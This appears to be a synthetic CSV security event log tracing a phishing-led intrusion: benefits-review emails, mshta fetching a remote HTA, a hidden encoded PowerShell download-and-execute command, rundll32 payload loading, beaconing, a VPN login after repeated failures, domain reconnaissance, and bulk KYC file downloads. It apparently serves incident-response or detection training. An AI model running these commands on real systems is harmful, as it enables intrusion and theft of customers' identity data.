event_id,timestamp,detail,url,verdict,source
E00305,2026-09-11 16:54:12,Action required: 2026 employee benefits review,https://ofservices-portal.com/benefits-review,ALLOW,Email gateway
E00307,2026-09-11 17:01:44,Reminder: benefits review closes today,https://ofservices-portal.com/benefits-review,ALLOW,Email gateway
P00378,2026-09-11 17:02:07,chrome.exe | chrome.exe https://ofservices-portal.com/benefits-review | Medium,,,Endpoint (EDR)
P00379,2026-09-11 17:03:19,mshta.exe | mshta.exe https://ofservices-portal.com/assets/update.hta | High,,,Endpoint (EDR)
D00310,2026-09-11 17:03:31,ofservices-portal.com 84512B DLP=URL-RISK-MONITOR ALLOW,,,Proxy/DLP
P00380,2026-09-11 17:03:44,powershell.exe | powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA | Critical,,,Endpoint (EDR)
P00381,2026-09-11 17:04:12,"rundll32.exe | rundll32.exe C:\Users\Public\wupdate.dat,Start | Critical",,,Endpoint (EDR)
D00311,2026-09-11 17:05:02,sync-statistics.net 912B DLP=NONE ALLOW,,,Proxy/DLP
D00313,2026-09-11 17:10:02,sync-statistics.net 1044B DLP=NONE ALLOW,,,Proxy/DLP
D00314,2026-09-11 17:15:03,sync-statistics.net 986B DLP=NONE ALLOW,,,Proxy/DLP
V00219,2026-09-11 18:03:25,,,,VPN
V00222,2026-09-11 18:18:05,102.134.88.19 (ZA) FAILURE/DENIED,,,VPN
V00223,2026-09-11 18:18:29,102.134.88.19 (ZA) FAILURE/DENIED,,,VPN
V00224,2026-09-11 18:18:58,102.134.88.19 (ZA) FAILURE/TIMEOUT,,,VPN
V00225,2026-09-11 18:19:22,102.134.88.19 (ZA) FAILURE/DENIED,,,VPN
V00226,2026-09-11 18:20:11,102.134.88.19 (ZA) SUCCESS/APPROVED,,,VPN
V00227,2026-09-11 18:22:01,,,,VPN
P00388,2026-09-11 18:25:33,"net.exe | net.exe group ""Domain Admins"" /domain | High",,,Endpoint (EDR)
P00389,2026-09-11 18:26:09,nltest.exe | nltest.exe /dclist:ofs.local | High,,,Endpoint (EDR)
X00753,2026-09-11 18:27:21,"READ HR_CONFIDENTIAL /hr/terminations/2026/terminations.xlsx (DENIED, 0B)",,,File/KYC server
X00754,2026-09-11 18:28:03,"READ PAYROLL_READ /payroll/monthly/2026-08/payroll.csv (DENIED, 0B)",,,File/KYC server
X00757,2026-09-11 18:30:17,"READ CRM_BASIC /crm/customer/profile/record-7742.json (SUCCESS, 18421B)",,,File/KYC server
X00759,2026-09-11 18:33:42,"LIST CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3 (SUCCESS, 1280B)",,,File/KYC server
X00760,2026-09-11 18:34:00,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50000.pdf (SUCCESS, 7737122B)",,,File/KYC server
X00761,2026-09-11 18:34:19,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50001.pdf (SUCCESS, 4773356B)",,,File/KYC server
X00762,2026-09-11 18:34:38,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50002.pdf (SUCCESS, 8439696B)",,,File/KYC server
X00763,2026-09-11 18:34:57,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50003.pdf (SUCCESS, 9008704B)",,,File/KYC server
X00764,2026-09-11 18:35:16,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50004.pdf (SUCCESS, 7601086B)",,,File/KYC server
X00765,2026-09-11 18:35:35,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50005.pdf (SUCCESS, 3715799B)",,,File/KYC server
X00766,2026-09-11 18:35:54,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50006.pdf (SUCCESS, 6663456B)",,,File/KYC server
X00767,2026-09-11 18:36:13,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50007.pdf (SUCCESS, 6979710B)",,,File/KYC server
X00768,2026-09-11 18:36:32,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50008.pdf (SUCCESS, 3849407B)",,,File/KYC server
X00769,2026-09-11 18:36:51,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50009.pdf (SUCCESS, 3703951B)",,,File/KYC server
X00770,2026-09-11 18:37:10,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50010.pdf (SUCCESS, 9857783B)",,,File/KYC server
X00771,2026-09-11 18:37:29,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50011.pdf (SUCCESS, 4582042B)",,,File/KYC server
X00772,2026-09-11 18:37:48,"DOWNLOAD CUSTOMER_EXPORT /customer/kyc/exports/2026-Q3/kyc-50012.pdf (SUCCESS, 10117797B)",,,File/KYC server
